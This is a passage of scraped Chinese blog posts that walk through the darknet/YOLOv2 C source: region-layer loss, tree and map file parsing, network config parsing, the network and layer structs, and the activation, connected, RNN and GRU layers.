+ i, 4); delta_region_mask(net.truth + t*(l.coords + 1) + b*l.truths + 5, l.output, l.coords - 4, mask_index, l.delta, l.w*l.h, l.mask_scale); &#125; if(iou &gt; .5) recall += 1; avg_iou += iou; //l.delta[best_index + 4] = iou - l.output[best_index + 4]; int obj_index = entry_index(l, b, best_n*l.w*l.h + j*l.w + i, l.coords); avg_obj += l.output[obj_index]; l.delta[obj_index] = l.object_scale * (1 - l.output[obj_index]); if (l.rescore) &#123; l.delta[obj_index] = l.object_scale * (iou - l.output[obj_index]); &#125; if(l.background)&#123; l.delta[obj_index] = l.object_scale * (0 - l.output[obj_index]); &#125; int class = net.truth[t*(l.coords + 1) + b*l.truths + l.coords]; if (l.map) class = l.map[class]; int class_index = entry_index(l, b, best_n*l.w*l.h + j*l.w + i, l.coords + 1); delta_region_class(l.output, l.delta, class_index, class, l.classes, l.softmax_tree, l.class_scale, l.w*l.h, &amp;avg_cat, !l.softmax); ++count; ++class_count; &#125; &#125; //printf(\"\\n\"); *(l.cost) = pow(mag_array(l.delta, l.outputs * l.batch), 2); printf(\"Region Avg IOU: %f, Class: %f, Obj: %f, No Obj: %f, Avg Recall: %f, count: %d\\n\", avg_iou/count, avg_cat/class_count, avg_obj/count, avg_anyobj/(l.w*l.h*l.n*l.batch), recall/count, count);&#125; 0x040102 backward_region_layer0x0402 read_tree12345678910tree *read_tree(char *filename)&#123; tree t = &#123;0&#125;; FILE *fp = fopen(filename, \"r\"); char *line; int last_parent = -1; int group_size = 0; int groups = 0; int n = 0; 我们先看一下tree这个结构体类型 123456789101112typedef struct&#123; int *leaf; int n; int *parent; int *child; int *group; char **name; int groups; int *group_size; int *group_offset;&#125; tree; 接着看后面这个循环结构 1234567891011121314151617181920212223242526272829while((line=fgetl(fp)) != 0)&#123;//读取一行，丢弃换行符 char *id = calloc(256, sizeof(char)); int parent = -1; sscanf(line, \"%s %d\", id, &amp;parent); t.parent = realloc(t.parent, (n+1)*sizeof(int)); t.parent[n] = parent; t.child = realloc(t.child, (n+1)*sizeof(int)); t.child[n] = -1; t.name = realloc(t.name, (n+1)*sizeof(char *)); t.name[n] = id; if(parent != last_parent)&#123; ++groups; t.group_offset = realloc(t.group_offset, groups * sizeof(int)); t.group_offset[groups - 1] = n - group_size; t.group_size = realloc(t.group_size, groups * sizeof(int)); t.group_size[groups - 1] = group_size; group_size = 0; last_parent = parent; &#125; t.group = realloc(t.group, (n+1)*sizeof(int)); t.group[n] = groups; if (parent &gt;= 0) &#123; t.child[parent] = groups; &#125; ++n; ++group_size; &#125; 我们以data/9k.tree文件中的部分内容作为例子，讲述这个文件的操作 1234n00002452 -1n00020827 -1n00002684 -1n11425580 -1 我们首先读取第一行n00002452 -1，接着id指向n00002452字符串，parent=-1，t.parent[0]-&gt;parent=-1，t.child[0]-&gt;-1，t.name[0]-&gt;&quot;n00002452&quot;，因为parent=last_parent=-1，所以跳过判断，接着t.group[0]-&gt;0，n=1，group_size=1 接着读取第二行n00020827 -1，id指向n00020827字符串，parent=-1，t.parent[1]-&gt;parent=-1，t.child[1]-&gt;-1，t.name[1]-&gt;&quot;n00020827&quot;，因为parent=last_parent=-1，所以跳过判断，接着t.group[0]-&gt;0，n=2，group_size=2 我们得到的最后结果是 接着往后 123456789101112131415161718 ++groups; t.group_offset = realloc(t.group_offset, groups * sizeof(int)); t.group_offset[groups - 1] = n - group_size; t.group_size = realloc(t.group_size, groups * sizeof(int)); t.group_size[groups - 1] = group_size; t.n = n; t.groups = groups; t.leaf = calloc(n, sizeof(int)); int i; for(i = 0; i &lt; n; ++i) t.leaf[i] = 1; for(i = 0; i &lt; n; ++i) if(t.parent[i] &gt;= 0) t.leaf[t.parent[i]] = 0; fclose(fp); tree *tree_ptr = calloc(1, sizeof(tree)); *tree_ptr = t; //error(0); return tree_ptr;&#125; 12345678groups=1t.group_offset[1-1]=4-4=0t.n=n=4t.groups=groups=1t.leaf[0]=1t.leaf[1]=1t.leaf[2]=1t.leaf[3]=1 最后得到的结果是 最后是整个数据得到的结果 0x0403 read_map1234567891011121314int *read_map(char *filename)&#123; int n = 0; int *map = 0; char *str; FILE *file = fopen(filename, \"r\"); if(!file) file_error(filename); while((str=fgetl(file)))&#123; ++n; map = realloc(map, n*sizeof(int)); map[n-1] = atoi(str); &#125; return map;&#125; 我这里取inet9k.map中的一部分作为例子 123452687410784077254... 得到的结果是 12345map[0]=2687map[1]=4107map[2]=8407map[3]=7254... 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 else if (lt == LSTM) &#123; l = parse_lstm(options, params); &#125;else if(lt == CRNN)&#123; l = parse_crnn(options, params); &#125;else if(lt == CONNECTED)&#123; l = parse_connected(options, params); &#125;else if(lt == CROP)&#123; l = parse_crop(options, params); &#125;else if(lt == COST)&#123; l = parse_cost(options, params); &#125;else if(lt == REGION)&#123; l = parse_region(options, params); &#125;else if(lt == DETECTION)&#123; l = parse_detection(options, params); &#125;else if(lt == SOFTMAX)&#123; l = parse_softmax(options, params); net-&gt;hierarchy = l.softmax_tree; &#125;else if(lt == NORMALIZATION)&#123; l = parse_normalization(options, params); &#125;else if(lt == BATCHNORM)&#123; l = parse_batchnorm(options, params); &#125;else if(lt == MAXPOOL)&#123; l = parse_maxpool(options, params); &#125;else if(lt == REORG)&#123; l = parse_reorg(options, params); &#125;else if(lt == AVGPOOL)&#123; l = parse_avgpool(options, params); &#125;else if(lt == ROUTE)&#123; l = parse_route(options, params, net); &#125;else if(lt == SHORTCUT)&#123; l = parse_shortcut(options, params, net); &#125;else if(lt == DROPOUT)&#123; l = parse_dropout(options, params); l.output = net-&gt;layers[count-1].output; l.delta = net-&gt;layers[count-1].delta;#ifdef GPU l.output_gpu = net-&gt;layers[count-1].output_gpu; l.delta_gpu = net-&gt;layers[count-1].delta_gpu;#endif else&#123; fprintf(stderr, \"Type not recognized: %s\\n\", s-&gt;type); &#125; l.truth = option_find_int_quiet(options, \"truth\", 0); l.onlyforward = option_find_int_quiet(options, \"onlyforward\", 0); l.stopbackward = option_find_int_quiet(options, \"stopbackward\", 0); l.dontload = option_find_int_quiet(options, \"dontload\", 0); l.dontloadscales = option_find_int_quiet(options, \"dontloadscales\", 0); l.learning_rate_scale = option_find_float_quiet(options, \"learning_rate\", 1); l.smooth = option_find_float_quiet(options, \"smooth\", 0); option_unused(options); net-&gt;layers[count] = l; if (l.workspace_size &gt; workspace_size) workspace_size = l.workspace_size; free_section(s); n = n-&gt;next; ++count; if(n)&#123; params.h = l.out_h; params.w = l.out_w; params.c = l.out_c; params.inputs = l.outputs; &#125; &#125; 12345678910111213141516171819202122232425262728free_list(sections); layer out = get_network_output_layer(net); net-&gt;outputs = out.outputs; net-&gt;truths = out.outputs; if(net-&gt;layers[net-&gt;n-1].truths) net-&gt;truths = net-&gt;layers[net-&gt;n-1].truths; net-&gt;output = out.output; net-&gt;input = calloc(net-&gt;inputs*net-&gt;batch, sizeof(float)); net-&gt;truth = calloc(net-&gt;truths*net-&gt;batch, sizeof(float));#ifdef GPU net-&gt;output_gpu = out.output_gpu; net-&gt;input_gpu = cuda_make_array(net-&gt;input, net-&gt;inputs*net-&gt;batch); net-&gt;truth_gpu = cuda_make_array(net-&gt;truth, net-&gt;truths*net-&gt;batch);#endif if(workspace_size)&#123; //printf(\"%ld\\n\", workspace_size);#ifdef GPU if(gpu_index &gt;= 0)&#123; net-&gt;workspace = cuda_make_array(0, (workspace_size-1)/sizeof(float)+1); &#125;else &#123; net-&gt;workspace = calloc(1, workspace_size); &#125;#else net-&gt;workspace = calloc(1, workspace_size);#endif &#125; return net;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 if(weightfile)&#123; load_weights(&amp;net, weightfile); &#125; printf(\"Learning Rate: %g, Momentum: %g, Decay: %g\\n\", net.learning_rate, net.momentum, net.decay); int imgs = net.batch*net.subdivisions; int i = *net.seen/imgs; data train, buffer; layer l = net.layers[net.n - 1]; int side = l.side; int classes = l.classes; float jitter = l.jitter; list *plist = get_paths(train_images); //int N = plist-&gt;size; char **paths = (char **)list_to_array(plist); load_args args = &#123;0&#125;; args.w = net.w; args.h = net.h; args.paths = paths; args.n = imgs; args.m = plist-&gt;size; args.classes = classes; args.jitter = jitter; args.num_boxes = side; args.d = &amp;buffer; args.type = REGION_DATA; args.angle = net.angle; args.exposure = net.exposure; args.saturation = net.saturation; args.hue = net.hue; pthread_t load_thread = load_data_in_thread(args); clock_t time; //while(i*imgs &lt; N*120)&#123; while(get_current_batch(net) &lt; net.max_batches)&#123; i += 1; time=clock(); pthread_join(load_thread, 0); train = buffer; load_thread = load_data_in_thread(args); printf(\"Loaded: %lf seconds\\n\", sec(clock()-time)); time=clock(); float loss = train_network(net, train); if (avg_loss &lt; 0) avg_loss = loss; avg_loss = avg_loss*.9 + loss*.1; printf(\"%d: %f, %f avg, %f rate, %lf seconds, %d images\\n\", i, loss, avg_loss, get_current_rate(net), sec(clock()-time), i*imgs); if(i%1000==0 || (i &lt; 1000 &amp;&amp; i%100 == 0))&#123; char buff[256]; sprintf(buff, \"%s/%s_%d.weights\", backup_directory, base, i); save_weights(net, buff); &#125; free_data(train); &#125; char buff[256]; sprintf(buff, \"%s/%s_final.weights\", backup_directory, base); save_weights(net, buff);&#125;","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2参数解析","slug":"2017-12-24-YOLOv2参数解析","date":"2017-12-23T16:00:00.000Z","updated":"2018-02-18T08:44:38.273Z","comments":true,"path":"2017/12/24/2017-12-24-YOLOv2参数解析/","link":"","permalink":"http://coordinate.wang/2017/12/24/2017-12-24-YOLOv2参数解析/","excerpt":"前言其实这一部分内容我在源代码分析中都有讲过，但是由于参数太多，所以特意做一次总结。如果你对于源代码很感兴趣，但对于这么多的代码，无从下手的话，你可以看我写的一系列文章YOLOv2源码分析 参数总结其实yolo v2的参数主要集中在两个结构体中一个是network，一个是layer","text":"前言其实这一部分内容我在源代码分析中都有讲过，但是由于参数太多，所以特意做一次总结。如果你对于源代码很感兴趣，但对于这么多的代码，无从下手的话，你可以看我写的一系列文章YOLOv2源码分析 参数总结其实yolo v2的参数主要集中在两个结构体中一个是network，一个是layer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566typedef struct network&#123; int n; //网络总层数 int batch; //一个batch包含的图片数目，看下面的subdivisions size_t *seen; //已经读取的图片数量 int *t; float epoch; //训练的次数 int subdivisions; //注意前面的batch/subdivisions才是网络的batch大小，可能目的是防止gpu显存不够 layer *layers; //指向网络的层 float *output; //指向输出特征图的内存空间 learning_rate_policy policy;//学习率的策略，是一个枚举类型 float learning_rate;//学习率 float momentum; //动量，一般0.9 float decay; //权重衰减正则项，防止过拟合 float gamma; //用于计算学习率 float scale; //用于计算学习率 float power; //用于计算学习率 int time_steps; //rnn中的移动步数 int step; //用于计算学习率 int max_batches; //最大的训练batch数目 float *scales; //用于计算学习率 int *steps; //用于计算学习率 int num_steps; //steps中的数据个数 int burn_in; int adam; //adam算法 float B1; //一阶矩估计的指数衰减率 float B2; //二阶矩估计的指数衰减率 float eps; //为了防止在实现中除以零 int inputs; //h*w*c输入图像大小 int outputs; //输出图像大小 int truths; //每一张图片含有的真实值参数个数 int notruth; int h, w, c; //输入图像的高，宽，通道数 int max_crop; //控制图片缩放的最大值 int min_crop; //控制图片缩放的最小值 float max_ratio; //控制图片缩放的最大比例 float min_ratio; //控制图片缩放的最小比例 int center; float angle; //设置旋转角度，扩充数据 float aspect; //设置方位，扩充数据 float exposure; //设置曝光量，扩充数据 float saturation; //设置饱和度，扩充数据 float hue; //设置色调，扩充数据 int random; //random为1时随机使用不同尺寸的图片进行训练 int gpu_index; //设置第几个gpu tree *hierarchy; float *input; //输入图像存储空间 float *truth; //存储了网络输入的所有图片的真实矩形框信息 float *delta; //误差存储空间 float *workspace; // int train; int index; float *cost;#ifdef GPU float *input_gpu; float *truth_gpu; float *delta_gpu; float *output_gpu;#endif&#125; network; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209struct layer&#123; LAYER_TYPE type; //layer类型 ACTIVATION activation; //激活函数类型 COST_TYPE cost_type; //损失函数类型 void (*forward) (struct layer, struct network); //不同的forward函数 void (*backward) (struct layer, struct network); //不同的backward函数 void (*update) (struct layer, update_args); //不同的update函数 void (*forward_gpu) (struct layer, struct network); void (*backward_gpu) (struct layer, struct network); void (*update_gpu) (struct layer, update_args); int batch_normalize; //BN操作 int shortcut; //shortcut连接操作 int batch; //batch大小 int forced; int flipped; int inputs; //输入的元素个数 int outputs; //输出的元素个数 int nweights; //权重数目 int nbiases; //偏向数目 int extra; int truths; //30*(5)，5表示class以及coordinate（xywh），30表示一幅图片最多处理多少个目标框 int h,w,c; //输入图像的高度，宽度，通道数 int out_h, out_w, out_c;//输出图像的高度，宽度，通道数 int n; //卷积层中表示卷积核的个数，region中表示anchors个数 int max_boxes; //30，表示一幅图片最多有多少目标在相同位置 int groups; //卷积核组数 int size; //kernel_size（包括卷积、池化） int side; int stride; //步长（包括卷积、池化） int reverse; int flatten; int spatial; int pad; //图像周围是否补0 int sqrt; //预测w,h是否开方 int flip; //翻转 int index; int binary; //权重二值化 int xnor; //权重和输入二值化 int steps; int hidden; //隐藏层的数量 int truth; float smooth; float dot; float angle; //旋转角度 float jitter; //抖动 float saturation; //饱和度 float exposure; //曝光量 float shift; //移动 float ratio; //缩放比率 float learning_rate_scale;//学习率系数 int softmax; //是否使用softmax int classes; //类别个数 int coords; //4（坐标参数个数） int background; int rescore; //非0时调整l.delta int objectness; int does_cost; int joint; int noadjust; //是否调整 int reorg; int log; //是否计算log int tanh; //gru中是否使用tanh激活函数 float alpha; float beta; float kappa; float coord_scale; //cost function的权重 float object_scale; //cost function的权重 float noobject_scale; //cost function的权重 float mask_scale; //cost function的权重 float class_scale; //cost function的权重 int bias_match; //为1时，计算best iou时，预测宽高强制与anchors一致 int random; //为1时随机改变图片大小 float thresh; //决定cost function是否有IOU int classfix; int absolute; int onlyforward; int stopbackward; int dontload; int dontloadscales; float temperature; float probability; float scale; char * cweights; int * indexes; int * input_layers; int * input_sizes; int * map; float * rand; float * cost; //损失 float * state; //rnn中当前层的状态 float * prev_state; //rnn中前一层的状态 float * forgot_state; //gru参数 float * forgot_delta; float * state_delta; float * combine_cpu; float * combine_delta_cpu; float * concat; float * concat_delta; float * binary_weights; //二值化的权重 float * biases; //偏置，BN中的系数beta；region层中的anchors float * bias_updates; //更新后的偏置 float * scales; //BN中的系数gamma float * scale_updates; float * weights; //权重 float * weight_updates; //更新后的权重 float * delta; //一个batch的梯度信息（region） float * output; //一个batch的输出存储空间（region） float * squared; float * norms; float * spatial_mean; float * mean; //标准差 float * variance; //方差 float * mean_delta; float * variance_delta; float * rolling_mean; float * rolling_variance; float * x; float * x_norm; float * m; float * v; float * bias_m; float * bias_v; float * scale_m; float * scale_v; float *z_cpu; //gru float *r_cpu; //gru float *h_cpu; //gru float * prev_state_cpu; float *temp_cpu; float *temp2_cpu; float *temp3_cpu; float *dh_cpu; float *hh_cpu; float *prev_cell_cpu; float *cell_cpu; float *f_cpu; float *i_cpu; float *g_cpu; float *o_cpu; float *c_cpu; float *dc_cpu; float * binary_input; struct layer *input_layer; struct layer *self_layer; struct layer *output_layer; struct layer *reset_layer; struct layer *update_layer; struct layer *state_layer; struct layer *input_gate_layer; struct layer *state_gate_layer; struct layer *input_save_layer; struct layer *state_save_layer; struct layer *input_state_layer; struct layer *state_state_layer; struct layer *input_z_layer; struct layer *state_z_layer; struct layer *input_r_layer; struct layer *state_r_layer; struct layer *input_h_layer; struct layer *state_h_layer; struct layer *wz; //gru参数 struct layer *uz; //gru参数 struct layer *wr; //gru参数 struct layer *ur; //gru参数 struct layer *wh; //gru参数 struct layer *uh; //gru参数 struct layer *uo; struct layer *wo; struct layer *uf; struct layer *wf; struct layer *ui; struct layer *wi; struct layer *ug; struct layer *wg; tree *softmax_tree; size_t workspace_size; ...&#125;","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（六）","slug":"2017-12-22-YOLOv2代码分析（六）","date":"2017-12-21T16:00:00.000Z","updated":"2018-02-18T08:44:30.003Z","comments":true,"path":"2017/12/22/2017-12-22-YOLOv2代码分析（六）/","link":"","permalink":"http://coordinate.wang/2017/12/22/2017-12-22-YOLOv2代码分析（六）/","excerpt":"我们再次回到了parse_network_cfg函数 1234//parse_network_cfgelse if(lt == ACTIVE)&#123; l = parse_activation(options, params); &#125;","text":"我们再次回到了parse_network_cfg函数 1234//parse_network_cfgelse if(lt == ACTIVE)&#123; l = parse_activation(options, params); &#125; 接着看后面这个parse_activation函数 #0x01 parse_activation 12345678910111213141516layer parse_activation(list *options, size_params params)&#123; char *activation_s = option_find_str(options, \"activation\", \"linear\"); ACTIVATION activation = get_activation(activation_s); layer l = make_activation_layer(params.batch, params.inputs, activation); l.out_h = params.h; l.out_w = params.w; l.out_c = params.c; l.h = params.h; l.w = params.w; l.c = params.c; return l;&#125; 上面的一些参数我在之前的文章中已经说过了，这里就不再说明了。直接看关键函数make_activation_layer 12345678layer make_activation_layer(int batch, int inputs, ACTIVATION activation)&#123;... l.forward = forward_activation_layer; l.backward = backward_activation_layer;... return l;&#125; 前面的参数信息我这里也不再提了，直接看关键的两个函数，先看第一个forward_activation_layer 0x0101 forward_activation_layer12345void forward_activation_layer(layer l, network net)&#123; copy_cpu(l.outputs*l.batch, net.input, 1, l.output, 1); activate_array(l.output, l.outputs*l.batch, l.activation);&#125; 貌似这里没什么好说的b（￣▽￣）d 0x0102 backward_activation_layer12345void backward_activation_layer(layer l, network net)&#123; gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); copy_cpu(l.outputs*l.batch, l.delta, 1, net.delta, 1);&#125; 貌似这里也没什么好说的d( •̀ ω •́ )y 回到parse_network_cfg函数 1234//parse_network_cfgelse if(lt == RNN)&#123; l = parse_rnn(options, params); &#125; #0x02 parse_rnn 123456789101112131415layer parse_rnn(list *options, size_params params)&#123; int output = option_find_int(options, \"output\",1); int hidden = option_find_int(options, \"hidden\",1); char *activation_s = option_find_str(options, \"activation\", \"logistic\"); ACTIVATION activation = get_activation(activation_s); int batch_normalize = option_find_int_quiet(options, \"batch_normalize\", 0); int logistic = option_find_int_quiet(options, \"logistic\", 0); layer l = make_rnn_layer(params.batch, params.inputs, hidden, output, params.time_steps, activation, batch_normalize, logistic); l.shortcut = option_find_int_quiet(options, \"shortcut\", 0); return l;&#125; 我先说说这里的几个参数的含义，因为我之前有的没有讲过。 hidden:RNN隐藏层的元素个数 time_steps:RNN的步长 logistic:Logistic激活函数 接着我们来看关键函数make_rnn_layer 0x02 make_rnn_layer作者这里使用的是vanilla RNN结构，有三个全连接层组成。 1234567891011121314151617181920212223242526layer make_rnn_layer(int batch, int inputs, int outputs, int steps, ACTIVATION activation, int batch_normalize, int adam)&#123;... l.input_layer = malloc(sizeof(layer));//隐藏层1 fprintf(stderr, \"\\t\\t\"); *(l.input_layer) = make_connected_layer(batch*steps, inputs, outputs, activation, batch_normalize, adam); l.input_layer-&gt;batch = batch; l.self_layer = malloc(sizeof(layer));//隐藏层2 fprintf(stderr, \"\\t\\t\"); *(l.self_layer) = make_connected_layer(batch*steps, outputs, outputs, activation, batch_normalize, adam); l.self_layer-&gt;batch = batch; l.output_layer = malloc(sizeof(layer));//隐藏层3 fprintf(stderr, \"\\t\\t\"); *(l.output_layer) = make_connected_layer(batch*steps, outputs, outputs, activation, batch_normalize, adam); l.output_layer-&gt;batch = batch; l.outputs = outputs; l.output = l.output_layer-&gt;output; l.delta = l.output_layer-&gt;delta; l.forward = forward_rnn_layer; l.backward = backward_rnn_layer; l.update = update_rnn_layer;... 我们看这里的make_connected_layer函数 0x0201 make_connected_layer12345678910layer make_connected_layer(int batch, int inputs, int outputs, ACTIVATION activation, int batch_normalize, int adam)&#123;... l.forward = forward_connected_layer; l.backward = backward_connected_layer; l.update = update_connected_layer; ...&#125; 这里的参数信息也没什么好说的，直接看函数吧 0x020101 forward_connected_layer1234567891011121314151617void forward_connected_layer(layer l, network net)&#123; fill_cpu(l.outputs*l.batch, 0, l.output, 1); int m = l.batch; int k = l.inputs; int n = l.outputs; float *a = net.input; float *b = l.weights; float *c = l.output; gemm(0,1,m,n,k,1,a,k,b,k,1,c,n); if(l.batch_normalize)&#123; forward_batchnorm_layer(l, net); &#125; else &#123; add_bias(l.output, l.biases, l.batch, l.outputs, 1); &#125; activate_array(l.output, l.outputs*l.batch, l.activation);&#125; 这个函数其实没什么好说的，要注意的地方就是这里的b是转置的。还有一个地方要注意的是，这里没有了groups和batch，这也非常好理解。 0x020102 backward_connected_layer12345678910111213141516171819202122232425262728void backward_connected_layer(layer l, network net)&#123; gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); if(l.batch_normalize)&#123; backward_batchnorm_layer(l, net); &#125; else &#123; backward_bias(l.bias_updates, l.delta, l.batch, l.outputs, 1); &#125; int m = l.outputs; int k = l.batch; int n = l.inputs; float *a = l.delta; float *b = net.input; float *c = l.weight_updates; gemm(1,0,m,n,k,1,a,m,b,n,1,c,n); m = l.batch; k = l.outputs; n = l.inputs; a = l.delta; b = l.weights; c = net.delta; if(c) gemm(0,0,m,n,k,1,a,k,b,n,1,c,n);&#125; 没什么好说的 0x020103 update_connected_layer123456789101112131415161718void update_connected_layer(layer l, update_args a)&#123; float learning_rate = a.learning_rate*l.learning_rate_scale; float momentum = a.momentum; float decay = a.decay; int batch = a.batch; axpy_cpu(l.outputs, learning_rate/batch, l.bias_updates, 1, l.biases, 1); scal_cpu(l.outputs, momentum, l.bias_updates, 1); if(l.batch_normalize)&#123; axpy_cpu(l.outputs, learning_rate/batch, l.scale_updates, 1, l.scales, 1); scal_cpu(l.outputs, momentum, l.scale_updates, 1); &#125; axpy_cpu(l.inputs*l.outputs, -decay*batch, l.weights, 1, l.weight_updates, 1); axpy_cpu(l.inputs*l.outputs, learning_rate/batch, l.weight_updates, 1, l.weights, 1); scal_cpu(l.inputs*l.outputs, momentum, l.weight_updates, 1);&#125; 没什么说的(￣▽￣)” 0x0202 forward_rnn_layer12345678910111213141516171819202122232425262728293031323334353637383940void forward_rnn_layer(layer l, network net)&#123; network s = net; s.train = net.train; int i; layer input_layer = *(l.input_layer); layer self_layer = *(l.self_layer); layer output_layer = *(l.output_layer); fill_cpu(l.outputs * l.batch * l.steps, 0, output_layer.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, self_layer.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, input_layer.delta, 1); if(net.train) fill_cpu(l.outputs * l.batch, 0, l.state, 1);//如果网络是训练状态的话，将state设置为0 for (i = 0; i &lt; l.steps; ++i) &#123; s.input = net.input; forward_connected_layer(input_layer, s); s.input = l.state; forward_connected_layer(self_layer, s); float *old_state = l.state;//存储当前状态 if(net.train) l.state += l.outputs*l.batch; if(l.shortcut)&#123;//是否添加shortcut连接 copy_cpu(l.outputs * l.batch, old_state, 1, l.state, 1); &#125;else&#123; fill_cpu(l.outputs * l.batch, 0, l.state, 1); &#125; axpy_cpu(l.outputs * l.batch, 1, input_layer.output, 1, l.state, 1); axpy_cpu(l.outputs * l.batch, 1, self_layer.output, 1, l.state, 1); s.input = l.state; forward_connected_layer(output_layer, s); //结束后，三个层都向前移动一步 net.input += l.inputs*l.batch; increment_layer(&amp;input_layer, 1); increment_layer(&amp;self_layer, 1); increment_layer(&amp;output_layer, 1); &#125;&#125; 先说说这个函数吧increment_layer 123456789101112131415static void increment_layer(layer *l, int steps)&#123; int num = l-&gt;outputs*l-&gt;batch*steps; l-&gt;output += num; l-&gt;delta += num; l-&gt;x += num; l-&gt;x_norm += num;#ifdef GPU l-&gt;output_gpu += num; l-&gt;delta_gpu += num; l-&gt;x_gpu += num; l-&gt;x_norm_gpu += num;#endif&#125; 这个函数的作用就是rnn向前的过程中，调整参数的初始位置。 这个RNN网络主要前向传播time_steps次。网络总共分为三层，第一层将输入数据编码（one-hot），是一个256的向量。第二层主要是传入上一次的状态和前一层的输出。第二层主要是传入上一次的状态和前一层的输出，并且输出结果转化为一个256维的向量，并且进行归一化处理。 0x0203 backward_rnn_layer12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849void backward_rnn_layer(layer l, network net)&#123; network s = net; s.train = net.train; int i; layer input_layer = *(l.input_layer); layer self_layer = *(l.self_layer); layer output_layer = *(l.output_layer); increment_layer(&amp;input_layer, l.steps-1); increment_layer(&amp;self_layer, l.steps-1); increment_layer(&amp;output_layer, l.steps-1); l.state += l.outputs*l.batch*l.steps; for (i = l.steps-1; i &gt;= 0; --i) &#123; copy_cpu(l.outputs * l.batch, input_layer.output, 1, l.state, 1); axpy_cpu(l.outputs * l.batch, 1, self_layer.output, 1, l.state, 1); s.input = l.state; s.delta = self_layer.delta; backward_connected_layer(output_layer, s); l.state -= l.outputs*l.batch; /* if(i &gt; 0)&#123; copy_cpu(l.outputs * l.batch, input_layer.output - l.outputs*l.batch, 1, l.state, 1); axpy_cpu(l.outputs * l.batch, 1, self_layer.output - l.outputs*l.batch, 1, l.state, 1); &#125;else&#123; fill_cpu(l.outputs * l.batch, 0, l.state, 1); &#125; */ s.input = l.state; s.delta = self_layer.delta - l.outputs*l.batch; if (i == 0) s.delta = 0; backward_connected_layer(self_layer, s); copy_cpu(l.outputs*l.batch, self_layer.delta, 1, input_layer.delta, 1); if (i &gt; 0 &amp;&amp; l.shortcut) axpy_cpu(l.outputs*l.batch, 1, self_layer.delta, 1, self_layer.delta - l.outputs*l.batch, 1); s.input = net.input + i*l.inputs*l.batch; if(net.delta) s.delta = net.delta + i*l.inputs*l.batch; else s.delta = 0; backward_connected_layer(input_layer, s); //误差传回后，后退一步 increment_layer(&amp;input_layer, -1); increment_layer(&amp;self_layer, -1); increment_layer(&amp;output_layer, -1); &#125;&#125; 没啥好说的(￣▽￣)” 0x0204 update_rnn_layer123456void update_rnn_layer(layer l, update_args a)&#123; update_connected_layer(*(l.input_layer), a); update_connected_layer(*(l.self_layer), a); update_connected_layer(*(l.output_layer), a);&#125; 更新参数信息，调用三次全连接层的更新函数 回到parse_network_cfg函数 123else if(lt == GRU)&#123; l = parse_gru(options, params); &#125; 0x03 parse_gru这一部分内容我本来不打算写了，因为这和YOLOv2没有一点关系，但是抱着一种学习的态度，我还是将这部分代码做一些简要地分析，如果有不对的地方，希望大家指出，互相学习。参考这篇论文 12345678910layer parse_gru(list *options, size_params params)&#123; int output = option_find_int(options, \"output\",1); int batch_normalize = option_find_int_quiet(options, \"batch_normalize\", 0); layer l = make_gru_layer(params.batch, params.inputs, output, params.time_steps, batch_normalize, params.net-&gt;adam); l.tanh = option_find_int_quiet(options, \"tanh\", 0);//tanh激活函数 return l;&#125; 我们现在看看这个make_gru_layer函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354layer make_gru_layer(int batch, int inputs, int outputs, int steps, int batch_normalize, int adam)&#123;... l.uz = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.uz) = make_connected_layer(batch*steps, inputs, outputs, LINEAR, batch_normalize, adam); l.uz-&gt;batch = batch; l.wz = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.wz) = make_connected_layer(batch*steps, outputs, outputs, LINEAR, batch_normalize, adam); l.wz-&gt;batch = batch; l.ur = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.ur) = make_connected_layer(batch*steps, inputs, outputs, LINEAR, batch_normalize, adam); l.ur-&gt;batch = batch; l.wr = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.wr) = make_connected_layer(batch*steps, outputs, outputs, LINEAR, batch_normalize, adam); l.wr-&gt;batch = batch; l.uh = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.uh) = make_connected_layer(batch*steps, inputs, outputs, LINEAR, batch_normalize, adam); l.uh-&gt;batch = batch; l.wh = malloc(sizeof(layer)); fprintf(stderr, \"\\t\\t\"); *(l.wh) = make_connected_layer(batch*steps, outputs, outputs, LINEAR, batch_normalize, adam); l.wh-&gt;batch = batch; l.batch_normalize = batch_normalize; l.outputs = outputs; l.output = calloc(outputs*batch*steps, sizeof(float)); l.delta = calloc(outputs*batch*steps, sizeof(float)); l.state = calloc(outputs*batch, sizeof(float)); l.prev_state = calloc(outputs*batch, sizeof(float)); l.forgot_state = calloc(outputs*batch, sizeof(float)); l.forgot_delta = calloc(outputs*batch, sizeof(float)); l.r_cpu = calloc(outputs*batch, sizeof(float)); l.z_cpu = calloc(outputs*batch, sizeof(float)); l.h_cpu = calloc(outputs*batch, sizeof(float)); l.forward = 